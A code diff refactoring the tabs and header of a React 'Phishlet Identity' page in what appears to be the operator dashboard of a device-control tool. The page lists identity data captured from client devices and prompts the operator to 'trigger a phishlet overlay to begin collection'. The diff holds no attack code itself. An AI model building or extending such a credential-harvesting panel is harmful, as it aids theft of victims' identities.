@@ -104,7 +104,7 @@ export default function PhishletPage() {
     return () => { if (toastTimer.current) clearTimeout(toastTimer.current); };
   }, []);
 
-  const { data: pageData, loading, error, refresh, sendCommand } = useDeviceData<PhishletPageData>({
+  const { data: pageData, loading, error, refresh } = useDeviceData<PhishletPageData>({
     clientId,
     page: 'phishlet',
     extractData: (d) => ({
@@ -231,7 +231,6 @@ export default function PhishletPage() {
 
       <DevicePageHeader
         title="Phishlet Identity"
-        icon={ShieldAlert}
         online={online}
         refresh={refresh}
         loading={loading}
@@ -249,26 +248,35 @@ export default function PhishletPage() {
 
       <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
         <div className="xl:col-span-3 space-y-3">
-          <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
+          <Tabs className="w-full">
             <TabsList className="grid w-full grid-cols-5">
               {types.map(t => (
-                <TabsTrigger key={t} value={t} className="text-xs">{typeLabels[t]}</TabsTrigger>
+                <TabsTrigger
+                  key={t}
+                  active={activeTab === t}
+                  onClick={() => setActiveTab(t)}
+                  className="text-xs"
+                >
+                  {typeLabels[t]}
+                </TabsTrigger>
               ))}
             </TabsList>
             {types.map((type) => (
-              <TabsContent key={type} value={type} className="mt-3 space-y-3">
-                {filterByType(type).length === 0 ? (
-                  <Card>
-                    <CardContent className="py-8 text-center">
-                      <ShieldAlert className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
-                      <p className="text-sm text-muted-foreground">No captured {type} data</p>
-                      <p className="text-[10px] text-muted-foreground mt-1">Trigger a phishlet overlay to begin collection</p>
-                    </CardContent>
-                  </Card>
-                ) : (
-                  filterByType(type).map((item, idx) => renderDataCard(item, idx))
-                )}
-              </TabsContent>
+              activeTab === type && (
+                <TabsContent key={type} className="mt-3 space-y-3">
+                  {filterByType(type).length === 0 ? (
+                    <Card>
+                      <CardContent className="py-8 text-center">
+                        <ShieldAlert className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
+                        <p className="text-sm text-muted-foreground">No captured {type} data</p>
+                        <p className="text-[10px] text-muted-foreground mt-1">Trigger a phishlet overlay to begin collection</p>
+                      </CardContent>
+                    </Card>
+                  ) : (
+                    filterByType(type).map((item, idx) => renderDataCard(item, idx))
+                  )}
+                </TabsContent>
+              )
             ))}
           </Tabs>
         </div>
